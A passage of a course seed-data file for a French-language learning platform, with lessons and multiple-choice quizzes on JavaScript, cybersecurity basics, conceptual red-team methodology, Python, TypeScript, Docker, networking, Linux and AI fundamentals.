          {
            order: 1,
            prompt: "Quelle instruction déclare une variable qui ne peut plus être réassignée ?",
            choices: ["var", "let", "const", "static"],
            correctIndex: 2,
            explanation:
              "`const` empêche la réassignation de la variable (attention : si c'est un objet/tableau, son *contenu* reste modifiable, seule la référence est verrouillée).",
          },
          {
            order: 2,
            prompt: "Quel est le type de la valeur `true` en JavaScript ?",
            choices: ["string", "boolean", "number", "object"],
            correctIndex: 1,
            explanation: "`true` et `false` sont des valeurs du type primitif `boolean`.",
          },
        ],
      },
      {
        order: 2,
        title: "Fonctions et portée",
        content:
          "Une fonction regroupe du code réutilisable. Syntaxe classique : `function add(a, b) { return a + b; }`. Les fonctions fléchées (arrow functions) offrent une syntaxe plus courte : `(a, b) => a + b`.\n\n" +
          "La portée (scope) détermine où une variable est accessible. `let` et `const` ont une portée de bloc : une variable déclarée dans un `{ }` (y compris dans un `if` ou une boucle) n'existe qu'à l'intérieur de ce bloc. `var`, elle, a une portée de fonction entière — une source classique de bugs, une raison de plus de préférer `let`/`const`.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Quelle syntaxe déclare une fonction fléchée qui additionne deux nombres ?",
            choices: [
              "function add(a,b) { return a+b }",
              "(a, b) => a + b",
              "def add(a,b): return a+b",
              "add(a,b) => { a+b }",
            ],
            correctIndex: 1,
            explanation:
              "`(a, b) => a + b` est une fonction fléchée avec retour implicite (pas besoin de `return` ni d'accolades pour une expression unique).",
          },
          {
            order: 2,
            prompt: "Une variable déclarée avec `let` à l'intérieur d'un bloc `{ }` est visible :",
            choices: [
              "Dans tout le fichier",
              "Uniquement dans ce bloc",
              "Uniquement dans les fonctions fléchées",
              "Jamais",
            ],
            correctIndex: 1,
            explanation:
              "C'est la portée de bloc : en dehors des accolades où elle a été déclarée, la variable n'existe plus.",
          },
        ],
      },
      {
        order: 3,
        title: "Boucles et conditions",
        content:
          "`if`/`else` exécute du code selon une condition. Pour répéter du code : `for` quand on connaît à l'avance le nombre d'itérations (souvent en parcourant un tableau), `while` quand on répète tant qu'une condition reste vraie, sans savoir combien de fois à l'avance.\n\n" +
          "Sur les tableaux, `array.map(fn)` est très utilisé : il retourne un **nouveau** tableau où chaque élément est le résultat de `fn` appliqué à l'élément original — le tableau de départ n'est jamais modifié.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt:
              "Quelle boucle est la plus adaptée pour répéter du code tant qu'une condition reste vraie, sans savoir à l'avance combien de fois ?",
            choices: ["for", "while", "switch", "const"],
            correctIndex: 1,
            explanation:
              "`while (condition) { ... }` répète tant que la condition est vraie — idéal quand le nombre d'itérations n'est pas connu à l'avance.",
          },
          {
            order: 2,
            prompt: "Que fait `array.map(fn)` ?",
            choices: [
              "Modifie le tableau original en place et ne retourne rien",
              "Retourne un nouveau tableau avec le résultat de fn appliqué à chaque élément",
              "Supprime les éléments qui ne satisfont pas fn",
              "Trie le tableau",
            ],
            correctIndex: 1,
            explanation:
              "`map` transforme chaque élément et retourne un nouveau tableau — le tableau original n'est jamais modifié (contrairement à des méthodes comme `sort` ou `splice`).",
          },
        ],
      },
    ],
  },
  {
    key: "cyber-fundamentals",
    title: "Cybersecurity Fundamentals",
    description:
      "Les bases pour ne plus faire confiance aveuglément : menaces courantes, mots de passe, réseaux.",
    category: "CYBERSECURITY",
    skillKey: "cyber-fundamentals",
    level: 1,
    lessons: [
      {
        order: 1,
        title: "Comprendre les menaces",
        content:
          "La règle d'or de la cybersécurité : **ne fais jamais confiance aveuglément, vérifie**. La majorité des attaques ne visent pas une faille technique, mais la confiance humaine.\n\n" +
          "Le **phishing** consiste à se faire passer pour une entité de confiance (banque, support technique, collègue) pour pousser la victime à révéler des informations sensibles ou exécuter une action dangereuse. L'**ingénierie sociale** (social engineering) est le terme plus large : manipuler une personne plutôt qu'une machine.\n\n" +
          "Le signal d'alerte le plus fiable n'est presque jamais le design du message (les faux messages sont souvent très soignés), mais un **sentiment d'urgence artificiel** : « fais-le maintenant, sinon... ». Une vraie urgence légitime laisse presque toujours le temps de vérifier.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Qu'est-ce que le phishing ?",
            choices: [
              "Un outil de chiffrement de données",
              "Une technique visant à tromper une personne pour lui voler des informations sensibles en se faisant passer pour une entité de confiance",
              "Un type de pare-feu",
              "Un protocole réseau",
            ],
            correctIndex: 1,
            explanation:
              "Le phishing exploite la confiance, pas une faille technique — d'où l'importance de vérifier l'expéditeur avant d'agir.",
          },
          {
            order: 2,
            prompt: "Quel est le signal d'alerte le plus courant d'une tentative de phishing ?",
            choices: [
              "Un design de message très soigné",
              "Un sentiment d'urgence artificiel poussant à agir vite sans réfléchir",
              "Une adresse email très longue",
              "Un message envoyé le matin",
            ],
            correctIndex: 1,
            explanation:
              "L'urgence artificielle (« sinon ton compte sera supprimé ») est conçue pour court-circuiter ta réflexion — c'est le signal le plus fiable, bien plus que l'apparence du message.",
          },
        ],
      },
      {
        order: 2,
        title: "Mots de passe et hashing",
        content:
          "Un service sérieux ne stocke JAMAIS ton mot de passe en clair. Il stocke un **hash** : le résultat d'une fonction à sens unique (impossible à inverser mathématiquement) appliquée à ton mot de passe. Même si la base de données fuite, l'attaquant récupère des hashs, pas les mots de passe.\n\n" +
          "Un **sel** (salt) est une valeur aléatoire ajoutée avant le hashing, unique par utilisateur : elle empêche les attaques par table arc-en-ciel (rainbow tables — des hashs précalculés pour des mots de passe courants), puisque deux utilisateurs avec le même mot de passe auront des hashs différents.\n\n" +
          "Bonnes pratiques : un mot de passe unique par service (un gestionnaire de mots de passe aide énormément), et l'activation de l'authentification à deux facteurs (2FA/MFA) partout où c'est possible — un mot de passe volé ne suffit alors plus à se connecter.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt:
              "Pourquoi les mots de passe sont-ils stockés sous forme de hash plutôt qu'en clair ?",
            choices: [
              "Pour économiser de l'espace disque",
              "Parce que le hash est une fonction à sens unique : même en cas de fuite de la base, l'attaquant ne peut pas retrouver facilement le mot de passe original",
              "Parce que c'est plus rapide à vérifier qu'un mot de passe en clair",
              "Ce n'est pas vrai, ils sont toujours stockés en clair",
            ],
            correctIndex: 1,
            explanation:
              "Le hashing est mathématiquement à sens unique : on ne peut pas « dé-hasher » pour retrouver le mot de passe d'origine, seulement vérifier qu'un mot de passe donné produit le même hash.",
          },
          {
            order: 2,
            prompt: "À quoi sert un sel (salt) dans le hashing de mots de passe ?",
            choices: [
              "À accélérer la connexion",
              "À empêcher les attaques par table arc-en-ciel en rendant chaque hash unique même pour deux mots de passe identiques",
              "À chiffrer la base de données entière",
              "À compresser le mot de passe",
            ],
            correctIndex: 1,
            explanation:
              "Sans sel, deux comptes avec le même mot de passe auraient le même hash — un attaquant pourrait utiliser des tables précalculées. Le sel rend chaque hash unique.",
          },
        ],
      },
      {
        order: 3,
        title: "Réseaux et défenses de base",
        content:
          "Un **pare-feu (firewall)** filtre le trafic réseau entrant et sortant selon des règles définies (ex: bloquer tout sauf le port 443). C'est une barrière, pas une garantie absolue — il ne protège pas contre une attaque qui passe par un canal autorisé (ex: un site web légitime compromis).\n\n" +
          "Un **VPN** crée un tunnel chiffré entre ton appareil et un serveur intermédiaire : utile pour cacher ton trafic aux intermédiaires du réseau (ex: sur un Wi-Fi public non fiable), mais ce n'est ni un antivirus, ni une protection contre le phishing.\n\n" +
          "Le principe du **moindre privilège** (least privilege) s'applique aussi bien aux réseaux qu'aux comptes utilisateurs : n'accorder que les accès strictement nécessaires, jamais plus « au cas où ».",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Que fait un pare-feu (firewall) ?",
            choices: [
              "Il chiffre automatiquement tout le trafic",
              "Il filtre le trafic réseau entrant/sortant selon des règles définies, pour bloquer ce qui n'est pas autorisé",
              "Il accélère la connexion internet",
              "Il stocke les mots de passe",
            ],
            correctIndex: 1,
            explanation:
              "Un pare-feu applique des règles de filtrage — ce n'est pas un outil de chiffrement, et il ne protège pas contre tout (ex: phishing via un canal autorisé).",
          },
          {
            order: 2,
            prompt: "Quel est le principal avantage d'un VPN ?",
            choices: [
              "Il rend ton ordinateur plus rapide",
              "Il crée un tunnel chiffré entre ton appareil et un serveur, cachant ton trafic aux intermédiaires du réseau (ex: Wi-Fi public)",
              "Il empêche tous les virus",
              "Il remplace un antivirus",
            ],
            correctIndex: 1,
            explanation:
              "Un VPN protège la confidentialité de ton trafic réseau vis-à-vis des intermédiaires — il ne remplace ni un antivirus, ni la vigilance face au phishing.",
          },
        ],
      },
    ],
  },
  {
    key: "redteam-fundamentals",
    title: "Red Team Fundamentals",
    description:
      "La méthodologie offensive expliquée conceptuellement : reconnaissance, exploitation, reporting — uniquement en environnements autorisés.",
    category: "CYBERSECURITY",
    skillKey: "red-team-fundamentals",
    level: 2,
    prerequisiteCourseKeys: ["cyber-fundamentals"],
    lessons: [
      {
        order: 1,
        title: "La méthodologie Red Team",
        content:
          "⚠️ Tout ce qui suit ne s'applique **que** dans le cadre d'un test d'intrusion autorisé par écrit (pentest, bug bounty avec périmètre défini, CTF). Attaquer un système sans autorisation est illégal, point final.\n\n" +
          "La méthodologie Red Team suit généralement ces phases : **Reconnaissance** (collecter de l'information sur la cible), **Enumeration** (identifier précisément services/versions exposés), **Exploitation** (exploiter une vulnérabilité identifiée pour obtenir un accès), **Privilege Escalation** (passer d'un accès limité à des droits plus élevés), **Post-Exploitation** (maintenir l'accès, explorer le réseau interne), et enfin **Reporting** — l'étape la plus négligée mais souvent la plus utile pour le client : sans un rapport clair et actionnable, l'intrusion la plus réussie ne sert à rien.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Dans quel cadre les techniques Red Team peuvent-elles être utilisées légalement ?",
            choices: [
              "Sur n'importe quel système accessible depuis internet",
              "Uniquement avec une autorisation écrite explicite du propriétaire du système (pentest, bug bounty avec périmètre défini)",
              "Sur les systèmes de la concurrence",
              "Sans restriction si l'intention est bonne",
            ],
            correctIndex: 1,
            explanation:
              "Sans autorisation écrite et un périmètre clairement défini, ces techniques constituent une intrusion illégale — peu importe l'intention.",
          },
          {
            order: 2,
            prompt: "Quelle est souvent l'étape la plus négligée mais la plus utile pour le client ?",
            choices: ["La reconnaissance", "L'exploitation", "Le reporting", "La post-exploitation"],
            correctIndex: 2,
            explanation:
              "Un rapport clair et actionnable est ce qui permet au client de corriger réellement les failles trouvées — sans lui, le test n'a pas de valeur pratique.",
          },
        ],
      },
      {
        order: 2,
        title: "Reconnaissance et énumération",
        content:
          "La **reconnaissance passive** collecte de l'information sans interagir directement avec la cible (OSINT : recherches publiques, réseaux sociaux, enregistrements DNS publics, offres d'emploi qui révèlent la stack technique...). La **reconnaissance active** interagit avec la cible (scan de ports, requêtes DNS directes) et laisse des traces détectables.\n\n" +
          "L'**énumération** va plus loin que la reconnaissance : une fois qu'un service est identifié (ex: un serveur web), on cherche sa version précise, ses configurations, ses éventuelles pages ou endpoints non protégés. Plus l'énumération est précise, plus il devient facile de cibler une vulnérabilité connue pour cette version exacte plutôt que d'essayer au hasard.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Qu'est-ce qui distingue la reconnaissance passive de la reconnaissance active ?",
            choices: [
              "La passive est illégale, l'active est légale",
              "La passive ne laisse aucune trace détectable par la cible (recherches publiques), l'active interagit directement avec elle",
              "Il n'y a aucune différence",
              "La passive est toujours plus rapide",
            ],
            correctIndex: 1,
            explanation:
              "La reconnaissance passive (OSINT, recherches publiques) ne touche jamais directement la cible, contrairement à un scan de ports par exemple, qui est actif et détectable.",
          },
          {
            order: 2,
            prompt: "Pourquoi l'énumération précise (version exacte d'un service) est-elle utile à un attaquant ?",
            choices: [
              "Elle ne sert à rien de particulier",
              "Elle permet de cibler des vulnérabilités connues spécifiques à cette version plutôt que d'essayer au hasard",
              "Elle rend le scan plus lent",
              "Elle est uniquement utile pour la défense, jamais l'attaque",
            ],
            correctIndex: 1,
            explanation:
              "Connaître la version exacte permet de chercher des CVE (vulnérabilités connues) documentées pour cette version précise, bien plus efficace qu'une approche à l'aveugle.",
          },
        ],
      },
      {
        order: 3,
        title: "De l'exploitation au reporting",
        content:
          "L'**exploitation** consiste à utiliser une vulnérabilité identifiée pour obtenir un accès initial. La **privilege escalation** cherche ensuite à passer d'un accès limité (ex: utilisateur standard) à des droits plus élevés (ex: administrateur) — souvent via une mauvaise configuration plutôt qu'une faille sophistiquée (permissions trop larges, mot de passe administrateur réutilisé...).\n\n" +
          "La **post-exploitation** explore ce qui est accessible depuis l'accès obtenu (mouvement latéral vers d'autres machines, données sensibles accessibles), toujours dans le périmètre autorisé. Enfin, le **rapport** doit lister chaque vulnérabilité trouvée avec sa sévérité, la preuve de concept, et une recommandation de correction concrète — c'est ce livrable, pas l'exploit lui-même, qui a de la valeur pour le client.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "La privilege escalation exploite le plus souvent :",
            choices: [
              "Toujours une faille 0-day sophistiquée",
              "Souvent une mauvaise configuration (permissions trop larges, mot de passe réutilisé) plutôt qu'une faille complexe",
              "Une attaque physique sur le serveur",
              "Un problème matériel",
            ],
            correctIndex: 1,
            explanation:
              "Dans la pratique, la privilege escalation vient très souvent d'erreurs de configuration simples, pas d'exploits sophistiqués — d'où l'importance du principe du moindre privilège.",
          },
          {
            order: 2,
            prompt: "Qu'est-ce qui a le plus de valeur pour le client à l'issue d'un test d'intrusion ?",
            choices: [
              "L'exploit technique en lui-même",
              "Un rapport clair listant les failles, leur sévérité, et des recommandations de correction concrètes",
              "Le temps passé sur le test",
              "Le nombre de systèmes compromis",
            ],
            correctIndex: 1,
            explanation:
              "Un rapport actionnable est ce qui permet au client de corriger réellement les failles — c'est le vrai livrable d'un test d'intrusion, pas l'exploit.",
          },
        ],
      },
    ],
  },
  {
    key: "python-intro",
    title: "Introduction à Python",
    description: "Les bases de Python : variables, structures de contrôle et fonctions.",
    category: "DEVELOPMENT",
    skillKey: "python",
    level: 1,
    lessons: [
      {
        order: 1,
        title: "Variables et types",
        content:
          "Python n'exige pas de déclarer le type d'une variable : `age = 25` suffit (typage dynamique). Les types de base sont `int` (entiers), `float` (décimaux), `str` (texte), `bool` (`True`/`False`).\n\n" +
          "Contrairement à JavaScript ou C, Python utilise l'**indentation** (espaces en début de ligne) pour délimiter les blocs de code, pas des accolades `{ }`. Une indentation incohérente provoque une erreur (`IndentationError`), pas juste un problème de style.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Comment Python délimite-t-il un bloc de code (dans un `if`, une fonction...) ?",
            choices: [
              "Avec des accolades { }",
              "Avec des mots-clés begin/end",
              "Avec l'indentation (espaces en début de ligne)",
              "Avec des points-virgules",
            ],
            correctIndex: 2,
            explanation:
              "L'indentation n'est pas qu'une convention de style en Python : elle fait partie de la syntaxe et délimite réellement les blocs.",
          },
          {
            order: 2,
            prompt: "Que faut-il écrire pour déclarer une variable `age` valant 25 en Python ?",
            choices: ["int age = 25", "var age = 25", "age = 25", "let age: int = 25"],
            correctIndex: 2,
            explanation:
              "Pas de mot-clé de déclaration ni de type explicite requis : `age = 25` suffit, Python déduit le type dynamiquement.",
          },
        ],
      },
      {
        order: 2,
        title: "Structures de contrôle et fonctions",
        content:
          "Une condition : `if age >= 18:` suivi d'un bloc indenté (pas de parenthèses obligatoires autour de la condition). Une boucle sur une collection : `for item in liste:`. Une fonction se déclare avec `def` : `def addition(a, b):` suivi d'un bloc indenté contenant `return a + b`.\n\n" +
          "Pas de point-virgule en fin de ligne, et les commentaires commencent par `#` (pas `//`).",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Quel mot-clé déclare une fonction en Python ?",
            choices: ["function", "def", "func", "fn"],
            correctIndex: 1,
            explanation: "`def nom_fonction(paramètres):` suivi d'un bloc indenté.",
          },
          {
            order: 2,
            prompt: "Quelle syntaxe parcourt chaque élément d'une liste `liste` en Python ?",
            choices: [
              "for (item in liste)",
              "foreach item in liste",
              "for item in liste:",
              "for (let item of liste)",
            ],
            correctIndex: 2,
            explanation: "`for item in liste:` — pas de parenthèses, et un `:` avant le bloc indenté.",
          },
        ],
      },
    ],
  },
  {
    key: "typescript-for-js-devs",
    title: "TypeScript pour devs JavaScript",
    description: "Pourquoi et comment adopter TypeScript quand on connaît déjà JavaScript.",
    category: "DEVELOPMENT",
    skillKey: "typescript",
    level: 2,
    lessons: [
      {
        order: 1,
        title: "Pourquoi TypeScript ?",
        content:
          "TypeScript ajoute un système de types statiques par-dessus JavaScript : les erreurs de type (ex: appeler une méthode qui n'existe pas sur une variable) sont détectées **à la compilation**, avant même d'exécuter le code — pas seulement au runtime comme en JS pur.\n\n" +
          "Le code TypeScript (`.ts`) est **transpilé** vers du JavaScript classique (`.js`) avant d'être exécuté — les navigateurs et Node.js n'exécutent jamais directement du TypeScript. Le fichier `tsconfig.json` configure cette compilation (version JS cible, niveau de strictness, etc.).",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Quand une erreur de type est-elle détectée avec TypeScript ?",
            choices: [
              "Uniquement au runtime, comme en JavaScript",
              "À la compilation, avant même d'exécuter le code",
              "Jamais, TypeScript ne vérifie pas les types",
              "Seulement si on active un plugin spécial",
            ],
            correctIndex: 1,
            explanation:
              "C'est tout l'intérêt du typage statique : une classe entière de bugs est détectée avant l'exécution, pas seulement quand le code passe par ce chemin précis.",
          },
          {
            order: 2,
            prompt: "Qu'exécutent réellement les navigateurs et Node.js ?",
            choices: [
              "Le code TypeScript directement",
              "Le code JavaScript obtenu après transpilation du TypeScript",
              "Un bytecode spécial",
              "Rien, TypeScript est juste de la documentation",
            ],
            correctIndex: 1,
            explanation:
              "TypeScript doit toujours être transpilé (compilé) vers du JavaScript classique avant exécution — le typage n'existe qu'au moment du développement.",
          },
        ],
      },
      {
        order: 2,
        title: "Types de base et interfaces",
        content:
          "On annote une variable avec `:` suivi du type : `let age: number = 25;`, `let nom: string = \"Alice\";`. Une **interface** décrit la forme d'un objet : `interface User { id: number; nom: string; email?: string; }` — le `?` rend une propriété optionnelle.\n\n" +
          "`type` et `interface` se ressemblent beaucoup pour décrire un objet ; `interface` est généralement préféré pour les objets/classes (extensible via `extends`), `type` est plus flexible pour des unions (`type Status = \"actif\" | \"inactif\"`).",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Que signifie le `?` après une propriété dans une interface (ex: `email?: string`) ?",
            choices: [
              "La propriété est obligatoire",
              "La propriété est optionnelle",
              "La propriété est en lecture seule",
              "Ça n'a aucun effet",
            ],
            correctIndex: 1,
            explanation:
              "`email?: string` signifie que la propriété `email` peut être omise sur un objet respectant cette interface.",
          },
          {
            order: 2,
            prompt: "Quelle syntaxe annote correctement une variable `age` de type `number` ?",
            choices: ["let age<number> = 25;", "let age: number = 25;", "let number age = 25;", "let age = number(25);"],
            correctIndex: 1,
            explanation: "L'annotation de type se place après `:` : `let age: number = 25;`.",
          },
        ],
      },
    ],
  },
  {
    key: "docker-basics",
    title: "Docker Basics",
    description: "Construire une image et lancer un conteneur : les bases pratiques de Docker.",
    category: "CLOUD",
    skillKey: "docker",
    level: 2,
    lessons: [
      {
        order: 1,
        title: "Dockerfile et images",
        content:
          "Un `Dockerfile` décrit comment construire une image : `FROM node:20` (image de base), `COPY . .` (copier les fichiers du projet), `RUN npm install` (exécuter une commande pendant le build), `CMD [\"node\", \"index.js\"]` (commande lancée au démarrage du conteneur).\n\n" +
          "Chaque instruction du Dockerfile crée une **couche** (layer) mise en cache : si seule la dernière instruction change, Docker réutilise les couches précédentes sans les refaire — d'où l'intérêt de placer `COPY package.json` et `RUN npm install` **avant** de copier tout le reste du code, pour ne pas invalider ce cache à chaque changement de code source.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Quelle instruction Dockerfile exécute une commande PENDANT la construction de l'image ?",
            choices: ["CMD", "RUN", "FROM", "ENTRYPOINT"],
            correctIndex: 1,
            explanation:
              "`RUN` s'exécute au moment du build (ex: `npm install`). `CMD` définit la commande lancée au démarrage du conteneur, pas pendant le build.",
          },
          {
            order: 2,
            prompt:
              "Pourquoi copier `package.json` et faire `npm install` AVANT de copier tout le reste du code dans le Dockerfile ?",
            choices: [
              "Ça n'a aucune importance, l'ordre est arbitraire",
              "Pour profiter du cache de build : si seul le code change (pas les dépendances), npm install n'est pas refait",
              "C'est obligatoire, Docker refuse sinon",
              "Pour réduire la taille de l'image finale",
            ],
            correctIndex: 1,
            explanation:
              "Docker met en cache chaque couche : tant que package.json ne change pas, la couche npm install est réutilisée telle quelle, même si le code source change constamment.",
          },
        ],
      },
      {
        order: 2,
        title: "Conteneurs et volumes",
        content:
          "`docker run -p 3000:3000 mon-image` lance un conteneur et mappe le port 3000 du conteneur vers le port 3000 de la machine hôte. `docker ps` liste les conteneurs en cours d'exécution.\n\n" +
          "Un conteneur est **éphémère** par défaut : ses données disparaissent quand il est supprimé. Un **volume** (`docker run -v mes-donnees:/data ...`) persiste les données en dehors du cycle de vie du conteneur — indispensable pour une base de données par exemple, qui ne doit pas perdre son contenu à chaque redéploiement.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Que fait l'option `-p 3000:3000` sur `docker run` ?",
            choices: [
              "Elle limite le conteneur à 3000 Mo de RAM",
              "Elle mappe le port 3000 du conteneur vers le port 3000 de la machine hôte",
              "Elle lance 3000 conteneurs",
              "Elle définit un délai d'expiration de 3000 secondes",
            ],
            correctIndex: 1,
            explanation:
              "Le format est `-p <port-hôte>:<port-conteneur>` — sans ça, le service à l'intérieur du conteneur n'est pas accessible depuis l'extérieur.",
          },
          {
            order: 2,
            prompt: "À quoi sert un volume Docker ?",
            choices: [
              "À accélérer le démarrage du conteneur",
              "À persister des données en dehors du cycle de vie éphémère du conteneur",
              "À compresser l'image",
              "À isoler le réseau du conteneur",
            ],
            correctIndex: 1,
            explanation:
              "Sans volume, toutes les données écrites dans un conteneur disparaissent quand il est supprimé — un volume les fait survivre, essentiel pour une base de données par exemple.",
          },
        ],
      },
    ],
  },
  {
    key: "networking-fundamentals",
    title: "Networking Fundamentals",
    description:
      "Comment les appareils communiquent sur un réseau : adresses IP, DNS, ports et protocoles.",
    category: "NETWORKING",
    skillKey: "networking-fundamentals",
    level: 1,
    lessons: [
      {
        order: 1,
        title: "Comment les appareils communiquent",
        content:
          "Chaque appareil sur un réseau a une **adresse IP** (ex: 192.168.1.42) qui l'identifie, un peu comme une adresse postale. Les données ne voyagent pas en un seul bloc : elles sont découpées en **paquets**, chacun contenant un morceau de données plus l'adresse de destination, envoyés indépendamment et réassemblés à l'arrivée.\n\n" +
          "Un **switch** relie plusieurs appareils au sein d'un même réseau local. Un **routeur** relie des réseaux différents entre eux (par exemple ton réseau domestique à internet) — c'est lui qui décide par quel chemin envoyer chaque paquet vers sa destination.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Comment les données voyagent-elles sur un réseau IP ?",
            choices: [
              "En un seul bloc envoyé d'un coup",
              "Découpées en paquets indépendants, envoyés séparément puis réassemblés à l'arrivée",
              "Uniquement via des câbles physiques dédiés à chaque appareil",
              "Elles ne voyagent jamais, seuls les noms de domaine circulent",
            ],
            correctIndex: 1,
            explanation:
              "Le découpage en paquets permet à plusieurs communications de partager le même réseau efficacement, et de reprendre uniquement les morceaux perdus plutôt que tout renvoyer.",
          },
          {
            order: 2,
            prompt: "Quelle est la différence entre un switch et un routeur ?",
            choices: [
              "Aucune différence",
              "Un switch relie des appareils au sein d'un même réseau local, un routeur relie des réseaux différents entre eux",
              "Un routeur ne fonctionne qu'en Wi-Fi",
              "Un switch est toujours plus rapide qu'un routeur",
            ],
            correctIndex: 1,
            explanation:
              "Ton routeur domestique fait le pont entre ton réseau local (géré en partie par un switch intégré) et internet.",
          },
        ],
      },
      {
        order: 2,
        title: "DNS, ports et protocoles",
        content:
          "Le **DNS** traduit un nom de domaine (nodify.app) en adresse IP, parce que les humains retiennent mieux des noms que des suites de chiffres. Un **port** identifie un service précis sur une machine : le port 443 pour HTTPS, le port 22 pour SSH — une même adresse IP peut faire tourner plusieurs services simultanément, chacun sur son port.\n\n" +
          "**TCP** garantit une livraison fiable et ordonnée (utilisé pour charger une page web, où rien ne doit manquer) ; **UDP** privilégie la vitesse sans garantie de livraison (utilisé pour le streaming vidéo ou les jeux en ligne, où une donnée en retard ne vaut plus la peine d'être renvoyée).",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "À quoi sert le DNS ?",
            choices: [
              "Chiffrer le trafic réseau",
              "Traduire un nom de domaine lisible en adresse IP compréhensible par les machines",
              "Accélérer la connexion internet",
              "Attribuer des adresses IP automatiquement aux appareils",
            ],
            correctIndex: 1,
            explanation:
              "Sans DNS, il faudrait retenir l'adresse IP exacte de chaque site — le DNS fait cette traduction automatiquement et invisiblement.",
          },
          {
            order: 2,
            prompt: "Pourquoi UDP est-il préféré à TCP pour du streaming vidéo en direct ?",
            choices: [
              "UDP est plus sécurisé que TCP",
              "UDP privilégie la vitesse sans attendre la retransmission des paquets perdus, ce qui convient au temps réel",
              "TCP ne fonctionne pas du tout pour la vidéo",
              "UDP garantit une livraison à 100% des paquets",
            ],
            correctIndex: 1,
            explanation:
              "En streaming, une image légèrement perdue n'a plus d'intérêt à être renvoyée une fois le direct passé à l'image suivante — TCP ralentirait inutilement en insistant pour tout retransmettre.",
          },
        ],
      },
    ],
  },
  {
    key: "linux-fundamentals",
    title: "Linux Fundamentals",
    description:
      "Les bases pour naviguer, gérer des fichiers et comprendre les permissions sous Linux.",
    category: "SYSTEMS",
    skillKey: "linux",
    level: 1,
    lessons: [
      {
        order: 1,
        title: "Naviguer et gérer des fichiers",
        content:
          "`pwd` affiche le répertoire courant, `ls` liste son contenu, `cd dossier` y entre. Pour créer/copier/déplacer/supprimer : `mkdir nom` (créer un dossier), `cp source destination` (copier), `mv source destination` (déplacer ou renommer), `rm fichier` (supprimer — irréversible, pas de corbeille par défaut en ligne de commande).\n\n" +
          "`cat fichier` affiche le contenu d'un fichier texte directement dans le terminal. La plupart de ces commandes acceptent des chemins relatifs (`./dossier`, par rapport à où tu es) ou absolus (`/home/user/dossier`, depuis la racine du système).",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Quelle commande affiche le répertoire dans lequel tu te trouves actuellement ?",
            choices: ["ls", "cd", "pwd", "cat"],
            correctIndex: 2,
            explanation: "`pwd` (print working directory) affiche le chemin complet du répertoire courant.",
          },
          {
            order: 2,
            prompt: "Que fait la commande `rm fichier.txt` ?",
            choices: [
              "Renomme le fichier",
              "Supprime le fichier — sans corbeille par défaut, donc irréversible",
              "Le déplace dans un dossier de sauvegarde",
              "Affiche son contenu",
            ],
            correctIndex: 1,
            explanation:
              "Contrairement à une suppression dans une interface graphique, `rm` en ligne de commande ne passe généralement pas par une corbeille — vérifie bien avant de valider.",
          },
        ],
      },
      {
        order: 2,
        title: "Permissions et processus",
        content:
          "Chaque fichier a des permissions pour trois catégories : le propriétaire, le groupe, les autres — chacune pouvant lire (r), écrire (w), exécuter (x). `chmod` modifie ces permissions, `chown` change le propriétaire.\n\n" +
          "`ps` liste les processus en cours (souvent combiné à `aux` pour tout voir), `top` affiche un tableau de bord en temps réel (CPU, mémoire par processus). Ajouter `&` à la fin d'une commande la lance en arrière-plan, libérant immédiatement le terminal pour autre chose.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Quelle commande change les permissions d'un fichier sous Linux ?",
            choices: ["chown", "chmod", "ps", "top"],
            correctIndex: 1,
            explanation: "`chmod 755 script.sh` par exemple rend le fichier exécutable pour son propriétaire et lisible/exécutable pour les autres.",
          },
          {
            order: 2,
            prompt: "Quelle commande affiche un tableau de bord des processus en temps réel ?",
            choices: ["ls", "top", "cd", "mv"],
            correctIndex: 1,
            explanation: "`top` se met à jour en continu et montre l'utilisation CPU/mémoire de chaque processus — utile pour repérer ce qui ralentit une machine.",
          },
        ],
      },
    ],
  },
  {
    key: "ai-fundamentals",
    title: "AI Fundamentals",
    description:
      "Les bases pour comprendre comment fonctionnent les IA modernes, leurs capacités et leurs limites réelles.",
    category: "AI",
    skillKey: "ai-fundamentals",
    level: 1,
    lessons: [
      {
        order: 1,
        title: "Qu'est-ce que l'intelligence artificielle ?",
        content:
          "L'IA est le domaine large qui vise à faire réaliser à des machines des tâches associées à l'intelligence humaine. Le **Machine Learning** (apprentissage automatique) en est une approche : plutôt que de programmer explicitement chaque règle, on entraîne un modèle à partir d'exemples (données).\n\n" +
          "En **apprentissage supervisé**, le modèle apprend à partir de données déjà étiquetées avec la bonne réponse (ex: des milliers de photos déjà marquées \"chat\" ou \"pas chat\"). Le **deep learning** utilise des réseaux de neurones à de nombreuses couches, particulièrement efficaces sur des données complexes (images, texte, son).",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Quelle est la relation entre IA, Machine Learning et Deep Learning ?",
            choices: [
              "Ce sont trois synonymes stricts",
              "Le Machine Learning est une approche de l'IA ; le Deep Learning est une famille de techniques de Machine Learning basée sur des réseaux de neurones profonds",
              "Le Deep Learning englobe l'IA et le Machine Learning",
              "Aucun rapport entre les trois",
            ],
            correctIndex: 1,
            explanation:
              "IA (le domaine large) ⊃ Machine Learning (apprentissage à partir de données) ⊃ Deep Learning (réseaux de neurones profonds) — des cercles concentriques, pas des synonymes.",
          },
          {
            order: 2,
            prompt: "Qu'est-ce que l'apprentissage supervisé ?",
            choices: [
              "Le modèle apprend sans aucune donnée",
              "Le modèle apprend à partir de données déjà étiquetées avec la bonne réponse connue",
              "Un synonyme strict de deep learning",
              "Le modèle apprend en jouant contre lui-même uniquement",
            ],
            correctIndex: 1,
            explanation:
